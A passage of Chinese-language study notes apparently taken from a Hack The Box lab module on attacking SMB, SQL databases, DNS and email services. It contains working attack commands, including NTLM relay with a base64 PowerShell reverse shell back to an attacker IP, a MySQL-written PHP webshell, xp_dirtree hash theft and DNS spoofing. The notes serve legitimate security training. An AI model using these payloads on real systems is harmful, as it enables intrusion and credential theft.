name&gt;</code></pre><p>假设用户错误地键入了共享文件夹的名称\mysharefoder\，而不是\mysharedfolder\。在这种情况下，所有名称解析都将失败，因为名称不存在，并且机器将向网络上的所有设备发送多播查询，包括我们运行的假冒SMB服务器。这是一个问题，因为没有采取任何措施来验证答复的完整性。攻击者可以通过监听此类查询和欺骗响应来利用这一机制，使受害者相信恶意服务器是可信的。这种信任通常用于窃取凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo responder -I ens33                                         __                 .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|                         NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0                 Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:                    LLMNR                      [ON]    NBT-NS                     [ON]            DNS/MDNS                   [ON]                                                                                                                                                                                             [+] Servers:             HTTP server                [ON]                                       HTTPS server               [ON]    WPAD proxy                 [OFF]                                      Auth proxy                 [OFF]    SMB server                 [ON]                                       Kerberos server            [ON]                                       SQL server                 [ON]                                       FTP server                 [ON]                                       IMAP server                [ON]                                       POP3 server                [ON]                                       SMTP server                [ON]                                       DNS server                 [ON]                                       LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON]                                                                                                                      [+] HTTP Options:                                                                      Always serving EXE         [OFF]                                                   Serving EXE                [OFF]                                                   Serving HTML               [OFF]                                                   Upstream Proxy             [OFF]                                               [+] Poisoning Options:                                                                 Analyze Mode               [OFF]                                                   Force WPAD auth            [OFF]                                                   Force Basic Auth           [OFF]                                                   Force LM downgrade         [OFF]                                                   Fingerprint hosts          [OFF]                                               [+] Generic Options:                                                                   Responder NIC              [tun0]                                                  Responder IP               [10.10.14.198]                                          Challenge set              [random]                                                Don&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          [+] Current Session Variables:                                                         Responder Machine Name     [WIN-2TY1Z1CIGXH]       Responder Domain Name      [HF2L.LOCAL]                                            Responder DCE-RPC Port     [48162] [+] Listening for events... [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[SMB] NTLMv2-SSP Client   : 10.10.110.17[SMB] NTLMv2-SSP Username : WIN7BOX\demouser[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000</code></pre><p>已破解NTLMv2哈希。密码是P@ssword.如果我们无法破解哈希，我们可以使用impacket ntlmrelayx或Responder MultiRelay.py将捕获的哈希中继到另一台机器。让我们看看使用impacket-ntlmrelay的示例。</p><p>首先，我们需要在响应程序配置文件（&#x2F;etc&#x2F;responser&#x2F;responder.conf）中将SMB设置为OFF。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/responder/Responder.conf | grep &#39;SMB =&#39;SMB = Off</code></pre><p>然后，我们使用选项–no http server、-sb2support执行impacket-ntlmrelayx，并使用选项-t执行目标机器。默认情况下，impacket-ntlmrelayx将转储SAM数据库，但我们可以通过添加选项-c来执行命令。</p><p>我们可以使用创建PowerShell反向shell<a href="https://www.revshells.com/%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%BA%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%81%E7%AB%AF%E5%8F%A3%E5%92%8C%E9%80%89%E9%A1%B9Powershell#3%EF%BC%88Base64%EF%BC%89%E3%80%82">https://www.revshells.com/，设置我们的机器IP地址、端口和选项Powershell#3（Base64）。</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>具有读取权限的共享文件夹的名称是什么？</p><p>用户名“jason”的密码是什么？</p><p>通过SSH以用户“jason”身份登录并找到标志.txt文件。提交内容作为您的答案。</p></blockquote><p>使用smbmap：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111559845.png" alt="image-20230811155958797"></p><p>根据给出的用户名爆破一下密码：</p><pre><code>crackmapexec smb 10.129.203.6 -u jason -p passwords.list --local-auth </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111612302.png" alt="image-20230811161236259"></p><p>这里使用ssh链接但是失败了，尝试使用rce</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111624866.png" alt="image-20230811162433821"></p><p>impact没有写权限，无语</p><h1 id="Attacking-SQL-Databases"><a href="#Attacking-SQL-Databases" class="headerlink" title="Attacking SQL Databases"></a>Attacking SQL Databases</h1><p>默认情况下，MSSQL使用端口TCP&#x2F;1433和UDP&#x2F;1434，MySQL使用TCP&#x2F;3306。但是，当MSSQL在“隐藏”模式下运行时，它使用TCP&#x2F;2433端口。我们可以使用Nmap的默认脚本-sC选项来枚举目标系统上的数据库服务</p><h4 id="MySQL-Connecting-to-the-SQL-Server"><a href="#MySQL-Connecting-to-the-SQL-Server" class="headerlink" title="MySQL - Connecting to the SQL Server"></a>MySQL - Connecting to the SQL Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13</code></pre><h4 id="Sqlcmd-Connecting-to-the-SQL-Server"><a href="#Sqlcmd-Connecting-to-the-SQL-Server" class="headerlink" title="Sqlcmd - Connecting to the SQL Server"></a>Sqlcmd - Connecting to the SQL Server</h4><pre><code class="cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></pre><p>注意：当我们使用sqlcmd向MSSQL进行身份验证时，我们可以使用参数-y（SQLCMDMAXVARTYPEWIDTH）和-y（SQLCMDMAXFIXEDTYPEWIDTH）来获得更好的输出。请记住，这可能会影响性能。</p><p>如果我们的目标是来自Linux的MSSQL，我们可以使用sqsh作为sqlcmd的替代方案：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -hsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. GrayPortions Copyright (C) 2004-2014 Michael Peppler and Martin WesdorpThis is free software with ABSOLUTELY NO WARRANTYFor more information type &#39;\warranty&#39;1&gt;</code></pre><p>或者，我们可以使用Impacket中名为mssqlclient.py的工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 </code></pre><h2 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h2><p>在攻击公共服务时，命令执行是最需要的功能之一，因为它允许我们控制操作系统。如果我们有适当的权限，我们可以使用SQL数据库执行系统命令或创建必要的元素来执行。</p><p>MSSQL有一个名为xp_cmdshell的扩展存储过程，它允许我们使用SQL执行系统命令。请记住以下关于xp_cmdshell的内容： xpcmdshell是一个强大的功能，默认情况下是禁用的。xp_cmdshell可以通过使用基于策略的管理或执行sp_configure来启用和禁用 xp_cmdshell派生的Windows进程与SQL Server服务帐户具有相同的安全权限 xp_cmdshell同步运行。在命令shell命令完成之前，控件不会返回给调用方 要在MSSQL上使用SQL语法执行命令，请使用：</p><pre><code class="cmd-session">1&gt; xp_cmdshell &#39;whoami&#39;2&gt; GO</code></pre><p>如果没有启用xp_cmdshell，如果我们有适当的权限，我们可以使用以下命令启用它：</p><pre><code class="mssql">-- To allow advanced options to be changed.  EXECUTE sp_configure &#39;show advanced options&#39;, 1GO-- To update the currently configured value for advanced options.  RECONFIGUREGO  -- To enable the feature.  EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1GO  -- To update the currently configured value for this feature.  RECONFIGUREGO</code></pre><p>MySQL支持用户定义函数，这允许我们在SQL中作为函数执行C&#x2F;C++代码，在这个GitHub存储库 <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>中有一个用于命令执行的用户定义函数。在生产环境中遇到这样的用户定义函数并不常见，但我们应该意识到，我们可能能够使用它</p><h2 id="Write-Local-Files"><a href="#Write-Local-Files" class="headerlink" title="Write Local Files"></a>Write Local Files</h2><p>如果我们有适当的权限，我们可以尝试在web服务器目录中使用SELECT INTO OUTFILE编写文件。然后我们可以浏览到文件所在的位置并执行我们的命令。</p><pre><code class="shell-session">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;Query OK, 1 row affected (0.001 sec)</code></pre><p>在MySQL中，全局系统变量secure_file_priv限制了数据导入和导出操作的效果，例如由LOAD data和SELECT…INTO OUTFILE语句以及LOAD_file（）函数执行的操作。这些操作只允许具有FILE权限的用户执行。</p><pre><code class="shell-session">mysql&gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name    | Value |+------------------+-------+| secure_file_priv |       |+------------------+-------+</code></pre><p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p><h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></pre><h2 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h2><p>在攻击SMB部分，我们讨论了我们可以创建一个假的SMB服务器来窃取哈希并在Windows操作系统中滥用一些默认实现。我们还可以使用xp_subdirs或xp_dirtree未记录的存储过程窃取MSSQL服务帐户哈希，这些存储过程使用SMB协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向SMB服务器时，目录侦听功能将强制服务器进行身份验证并发送运行SQL server的服务帐户的NTLMv2哈希。 为了实现这一点，我们需要首先启动Responder或impacket-smbserver，并执行以下SQL查询之一：</p><h4 id="XP-DIRTREE-Hash-Stealing"><a href="#XP-DIRTREE-Hash-Stealing" class="headerlink" title="XP_DIRTREE Hash Stealing"></a>XP_DIRTREE Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h4 id="XP-SUBDIRS-Hash-Stealing"><a href="#XP-SUBDIRS-Hash-Stealing" class="headerlink" title="XP_SUBDIRS Hash Stealing"></a>XP_SUBDIRS Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>What is the password for the “mssqlsvc” user?</p></blockquote><p>这里尝试了用给到的字典进行爆破，发现不可行，反复阅读文案后发现可以导出hash：</p><p>先监听</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122043562.png" alt="image-20230812204234008"></p><p>然后执行查询语句弹回hash</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308161515067.png" alt="image-20230812204400386"></p><p>然后破解hash即可</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122050713.png" alt="image-20230812205036653"></p><h1 id="Attacking-DNS"><a href="#Attacking-DNS" class="headerlink" title="Attacking DNS"></a>Attacking DNS</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDTNmap scan report for 10.10.110.213Host is up (0.017s latency).PORT    STATE  SERVICE     VERSION53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</code></pre><p>DNS区域是特定组织或管理员管理的DNS命名空间的一部分。由于DNS包括多个DNS区域，DNS服务器利用DNS区域传输将其数据库的一部分复制到另一个DNS服务器。除非DNS服务器配置正确（限制哪些IP可以执行DNS区域传输），否则任何人都可以向DNS服务器索取其区域信息的副本，因为DNS区域传输不需要任何身份验证。此外，DNS服务通常在UDP端口上运行；然而，在执行DNS区域传输时，它使用TCP端口进行可靠的数据传输。 攻击者可以利用此DNS区域传输漏洞来了解有关目标组织的DNS命名空间的更多信息，从而增加攻击面。为了利用此漏洞，我们可以使用带有DNS查询类型AXFR选项的dig实用程序从易受攻击的DNS服务器中转储整个DNS命名空间：</p><pre><code class="shell-session">Tanin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213;; global options: +cmdinlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800inlanefrieght.htb.         604800  IN      AAAA    ::1inlanefrieght.htb.         604800  IN      NS      localhost.inlanefrieght.htb.         604800  IN      A       10.129.110.22admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25support.inlanefrieght.htb. 604800  IN      A       10.129.110.28inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 28 msec;; SERVER: 10.129.110.213#53(10.129.110.213);; WHEN: Mon Oct 11 17:20:13 EDT 2020;; XFR size: 8 records (messages 1, bytes 289)</code></pre><p>像 <a href="https://github.com/mschwager/fierce">Fierce</a>这样的工具也可以用来枚举根域的所有DNS服务器，并扫描DNS区域传输：</p><pre><code class="shell-session">Tanin@htb[/htb]# fierce --domain zonetransfer.me</code></pre><h2 id="Domain-Takeovers-amp-Subdomain-Enumeration"><a href="#Domain-Takeovers-amp-Subdomain-Enumeration" class="headerlink" title="Domain Takeovers &amp; Subdomain Enumeration"></a>Domain Takeovers &amp; Subdomain Enumeration</h2><p>在执行子域接管之前，我们应该使用<a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>等工具枚举目标域的子域。这个工具可以从像 <a href="https://dnsdumpster.com/">DNSdumpster</a>这样的开放源代码中抓取子域。<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等其他工具也可以通过提供预先生成的单词列表来使用暴力子域：</p><pre><code class="shell-session">Tanin@htb[/htb]# ./subfinder -d inlanefreight.com -v                                                                                      _     __ _         _                                           ____  _| |__ / _(_)_ _  __| |___ _ _          (_-&lt; || | &#39;_ \  _| | &#39; \/ _  / -_) &#39;_|                 /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                                 projectdiscovery.io                                                                                           [WRN] Use with caution. You are responsible for your actions[WRN] Developers assume no liability and are not responsible for any misuse or damage.[WRN] By using subfinder, you also agree to the terms of the APIs used.                                    [INF] Enumerating subdomains for inlanefreight.com[alienvault] www.inlanefreight.com[dnsdumpster] ns1.inlanefreight.com[dnsdumpster] ns2.inlanefreight.com...snip...[bufferover] Source took 2.193235338s for enumerationns2.inlanefreight.comwww.inlanefreight.comns1.inlanefreight.comsupport.inlanefreight.com[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds</code></pre><p>一个很好的替代方案是一种名为<a href="https://github.com/TheRook/subbrute">Subbrute</a>的工具。该工具允许我们使用自定义解析器，并在无法访问Internet的主机上进行内部渗透测试时执行纯DNS暴力攻击。</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1Tanin@htb[/htb]$ cd subbruteTanin@htb[/htb]$ echo &quot;ns1.inlanefreight.com&quot; &gt; ./resolvers.txtTanin@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt</code></pre><p>有时内部物理配置的安全性很差，我们可以利用它从U盘上传工具。另一种情况是，我们已经通过转向到达了一个内部主机，并希望在那里工作。当然，还有其他选择，但知道其他方式和可能性并没有坏处。 该工具发现了四个与inlanefreight.com相关的子域。使用nslookup或host命令，我们可以枚举这些子域的CNAME记录。</p><pre><code class="shell-session">Tanin@htb[/htb]# host support.inlanefreight.comsupport.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com</code></pre><p>支持子域有一个指向AWS S3存储桶的别名记录。但是，URL<a href="https://support.inlanefreight.com显示了一个nosuchbucket错误,表明子域可能容易受到子域接管的攻击.现在,我们可以通过创建一个具有相同子域名称的aws/">https://support.inlanefreight.com显示了一个NoSuchBucket错误，表明子域可能容易受到子域接管的攻击。现在，我们可以通过创建一个具有相同子域名称的AWS</a> S3 bucket来接管子域。</p><p> <a href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a>存储库也是子域接管漏洞的绝佳参考。它显示了目标服务是否易受子域接管的攻击，并提供了评估漏洞的指导方针。</p><h4 id="Local-DNS-Cache-Poisoning"><a href="#Local-DNS-Cache-Poisoning" class="headerlink" title="Local DNS Cache Poisoning"></a>Local DNS Cache Poisoning</h4><p>从本地网络的角度来看，攻击者还可以使用 <a href="https://www.ettercap-project.org/">Ettercap</a> 或<a href="https://www.bettercap.org/">Bettercap</a>等MITM工具执行DNS缓存中毒。 要通过Ettercap利用DNS缓存中毒，我们应该首先编辑&#x2F;etc&#x2F;Ettercap&#x2F;etter.DNS文件，以映射他们想要欺骗的目标域名（例如，inlanefreight.com）和他们想要将用户重定向到的攻击者的IP地址（例如，192.168.225.110）：</p><pre><code class="shell-session">Tanin@htb[/htb]# cat /etc/ettercap/etter.dnsinlanefreight.com      A   192.168.225.110*.inlanefreight.com    A   192.168.225.110</code></pre><p>接下来，启动Ettercap工具，并通过导航到主机&gt;扫描主机来扫描网络中的活动主机。完成后，将目标IP地址（例如192.168.152.129）添加到Target1，并将默认网关IP（例如192.168.152.2）添加到Target2。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743246.png" alt="img"></p><p>通过导航到插件&gt;管理插件来激活dns_恶搞攻击。这将向目标计算机发送假DNS响应，该响应将解析inlanefreight.com到IP地址192.168.225.110：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743982.png" alt="img"></p><p>成功的DNS欺骗攻击后，如果来自目标机器192.168.152.129的受害者用户在web浏览器上访问inlanefreight.com域，他们将被重定向到IP地址192.168.225.110上的虚假页面，此外，从目标IP地址192.168.152.129到inlanefreight.com的ping也应解析为192.168.225.110：</p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Find all available DNS records for the “inlanefreight.htb” domain on the target name server and submit the flag found as a DNS record as the answer.</p></blockquote><h1 id="Attacking-Email-Services"><a href="#Attacking-Email-Services" class="headerlink" title="Attacking Email Services"></a>Attacking Email Services</h1><p>邮件服务器（有时也称为电子邮件服务器）是一种通过网络（通常是通过互联网）处理和发送电子邮件的服务器。邮件服务器可以从客户端设备接收电子邮件并将其发送到其他邮件服务器。邮件服务器还可以向客户端设备发送电子邮件。客户端通常是我们阅读电子邮件的设备（电脑、智能手机等）。 当我们按下电子邮件应用程序（电子邮件客户端）中的“发送”按钮时，该程序将建立与网络或Internet上SMTP服务器的连接。SMTP这个名称代表简单邮件传输协议，它是一种将电子邮件从客户端传递到服务器以及从服务器传递到其他服务器的协议。 当我们将电子邮件下载到电子邮件应用程序时，它将连接到互联网上的POP3或IMAP4服务器，这允许用户将邮件保存在服务器邮箱中并定期下载。 默认情况下，POP3客户端会从电子邮件服务器中删除下载的邮件。这种行为使得在多个设备上访问电子邮件变得困难，因为下载的邮件存储在本地计算机上。但是，我们通常可以将POP3客户端配置为在服务器上保留下载邮件的副本。 另一方面，默认情况下，IMAP4客户端不会从电子邮件服务器中删除下载的邮件。此行为使从多个设备访问电子邮件变得容易。让我们看看如何针对邮件服务器。</p><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>电子邮件服务器很复杂，通常需要我们枚举多个服务器、端口和服务。此外，如今大多数公司的电子邮件服务都在云端，并提供 <a href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a>或 <a href="https://workspace.google.com/solutions/new-business/">G-Suite</a>等服务。因此，我们攻击电子邮件服务的方法取决于所使用的服务。 我们可以使用邮件交换（MX）DNS记录来识别邮件服务器。MX记录指定负责代表域名接受电子邮件的邮件服务器。可以配置几个MX记录，通常指向一个邮件服务器阵列以实现负载平衡和冗余。 我们可以使用主机或挖掘等工具以及<a href="https://mxtoolbox.com/">MXToolbox</a>等在线网站来查询有关MX记录的信息</p><h4 id="Host-MX-Records"><a href="#Host-MX-Records" class="headerlink" title="Host - MX Records"></a>Host - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX hackthebox.euhackthebox.eu mail is handled by 1 aspmx.l.google.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX microsoft.commicrosoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.</code></pre><h4 id="DIG-MX-Records"><a href="#DIG-MX-Records" class="headerlink" title="DIG - MX Records"></a>DIG - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx plaintext.do | grep &quot;MX&quot; | grep -v &quot;;&quot;plaintext.do.           7076    IN      MX      50 mx3.zoho.com.plaintext.do.           7076    IN      MX      10 mx.zoho.com.plaintext.do.           7076    IN      MX      20 mx2.zoho.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.</code></pre><h4 id="DIG-A-Record-for-MX"><a href="#DIG-A-Record-for-MX" class="headerlink" title="DIG - A Record for MX"></a>DIG - A Record for MX</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t A mail1.inlanefreight.htb.mail1.inlanefreight.htb has address 10.129.14.128</code></pre><p>这些MX记录表明，前三个邮件服务使用的是云服务G-Suite（aspmx.l.google.com）、Microsoft 365（Microsoft.com.mail.protection.outlook.com）和Zoho（MX.Zoho.com），最后一个可能是该公司托管的自定义邮件服务器。 此信息至关重要，因为枚举方法可能因服务而异。例如，大多数云服务提供商使用他们的邮件服务器实现，并采用现代身份验证，这为每个服务提供商打开了新的、唯一的攻击向量。另一方面，如果公司配置服务，我们可能会发现允许对邮件服务器协议进行常见攻击的不良做法和错误配置。 如果我们的目标是一个自定义邮件服务器实现，如inlanefreight.htb，我们可以列举以下端口：</p><table><thead><tr><th><code>TCP/25</code></th><th>SMTP Unencrypted</th></tr></thead><tbody><tr><td><code>TCP/143</code></td><td>IMAP4 Unencrypted</td></tr><tr><td><code>TCP/110</code></td><td>POP3 Unencrypted</td></tr><tr><td><code>TCP/465</code></td><td>SMTP Encrypted</td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 Encrypted</td></tr><tr><td><code>TCP/995</code></td><td>POP3 Encrypted</td></tr></tbody></table><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128</code></pre><h2 id="Misconfigurations"><a href="#Misconfigurations" class="headerlink" title="Misconfigurations"></a>Misconfigurations</h2><p>电子邮件服务使用身份验证来允许用户发送电子邮件和接收电子邮件。当SMTP服务允许匿名身份验证或支持可用于枚举有效用户名的协议时，可能会发生配置错误。</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>SMTP服务器有不同的命令，可用于枚举有效用户名VRFY、EXPN和RCPT to。如果我们成功枚举有效用户名，我们可以尝试密码喷洒、暴力破解或猜测有效密码。因此，让我们探究一下这些命令是如何工作的。</p><h4 id="VRFY-Command"><a href="#VRFY-Command" class="headerlink" title="VRFY Command"></a>VRFY Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)VRFY root252 2.0.0 rootVRFY www-data252 2.0.0 www-dataVRFY new-user550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table</code></pre><p>EXPN与VRFY类似，只是当与通讯组列表一起使用时，它会列出该列表中的所有用户。这可能是一个比VRFY命令更大的问题，因为站点通常有一个别名，如“all”</p><h4 id="EXPN-Command"><a href="#EXPN-Command" class="headerlink" title="EXPN Command"></a>EXPN Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)EXPN john250 2.1.0 john@inlanefreight.htbEXPN support-team250 2.0.0 carol@inlanefreight.htb250 2.1.5 elisa@inlanefreight.htb</code></pre><p>RCPT TO标识电子邮件的收件人。对于给定的邮件，可以多次重复此命令，以便将单个邮件传递给多个收件人。</p><h4 id="RCPT-TO-Command"><a href="#RCPT-TO-Command" class="headerlink" title="RCPT TO Command"></a>RCPT TO Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)MAIL FROM:test@htb.comit is250 2.1.0 test@htb.com... Sender okRCPT TO:julio550 5.1.1 julio... User unknownRCPT TO:kate550 5.1.1 kate... User unknownRCPT TO:john250 2.1.5 john... Recipient ok</code></pre><p>我们还可以根据服务实现使用POP3协议来枚举用户。例如，我们可以使用USER命令和用户名，如果服务器的响应为OK，这意味着用户存在于服务器上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 110Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.+OK POP3 Server readyUSER julio-ERRUSER john+OK</code></pre><p>为了自动化我们的枚举过程，我们可以使用一个名为 <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>的工具。我们可以用后面跟着VRFY、EXPN或RCPT的参数-M指定枚举模式，用包含要枚举的用户列表的文件指定参数-U。根据服务器实现和枚举模式，我们需要添加带有参数-D的电子邮件地址的域。最后，我们用参数-t指定目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></pre><h2 id="Cloud-Enumeration"><a href="#Cloud-Enumeration" class="headerlink" title="Cloud Enumeration"></a>Cloud 